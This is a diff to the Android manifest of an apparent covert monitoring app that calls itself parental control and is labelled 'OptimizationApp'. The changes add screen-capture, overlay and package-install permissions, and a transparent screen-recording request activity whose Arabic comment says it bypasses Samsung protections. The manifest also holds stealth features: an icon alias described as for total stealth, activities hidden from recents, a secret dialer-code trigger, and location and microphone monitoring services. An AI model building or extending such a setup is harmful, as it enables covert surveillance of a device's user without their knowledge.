@@ -15,6 +15,7 @@
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" 
         tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <!-- تتبع الموقع -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -31,6 +32,7 @@
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
     <!-- أذونات النظام الحساسة -->
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
@@ -40,6 +42,7 @@
         tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" 
         tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
     <application
         android:name=".OptimizationApp"
@@ -48,15 +51,20 @@
         android:label="@string/app_name"
         android:roundIcon="@android:drawable/ic_menu_preferences"
         android:supportsRtl="true"
-        android:theme="@style/Theme.AppCompat.NoActionBar"
-        android:persistent="true">
+        android:theme="@style/Theme.SyncService">
 
-        <!-- النشاط الرئيسي -->
         <activity
             android:name=".MainActivity"
             android:excludeFromRecents="true"
             android:exported="true"
-            android:theme="@style/Theme.AppCompat.NoActionBar">
+            android:theme="@style/Theme.SyncService">
+        </activity>
+
+        <activity
+            android:name=".LoginActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:theme="@style/Theme.App.Starting">
         </activity>
 
         <!-- Alias للتحكم في الأيقونة بشكل منفصل واستئجار التخفي التام -->
@@ -66,7 +74,7 @@
             android:exported="true"
             android:icon="@android:drawable/ic_menu_preferences"
             android:label="@string/app_name"
-            android:targetActivity=".MainActivity">
+            android:targetActivity=".LoginActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -78,6 +86,16 @@
             android:name=".HiddenSettingsActivity"
             android:excludeFromRecents="true"
             android:exported="false" />
+
+        <!-- منفذ حصري لطلب تصوير الشاشة (شفاف لتجاوز حماية سامسونج) -->
+        <!-- منفذ حصري لطلب تصوير الشاشة (تحديث لتجاوز حماية سامسونج) -->
+        <activity
+            android:name=".MediaProjectionRequestActivity"
+            android:theme="@style/Theme.SyncService"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:taskAffinity=""
+            android:launchMode="singleTask" />
 
         <!-- خدمة المراقبة الأساسية -->
         <service
@@ -118,6 +136,15 @@
             </intent-filter>
         </receiver>
 
+        <!-- مستقبل نتائج تثبيت التحديثات (PackageInstaller callback) -->
+        <receiver
+            android:name=".UpdateInstallReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.example.parentalcontrol.UPDATE_INSTALL_RESULT" />
+            </intent-filter>
+        </receiver>
+
         <!-- مستقبل إعادة التشغيل -->
         <receiver
             android:name=".ServiceRestartReceiver"
@@ -129,13 +156,12 @@
             </intent-filter>
         </receiver>
 
-        <!-- مستقبل الرمز السري (*#1234#) -->
         <receiver
             android:name=".SecretCodeReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="199018" />
+                <data android:scheme="android_secret_code" android:host="1356365508" />
             </intent-filter>
         </receiver>
 
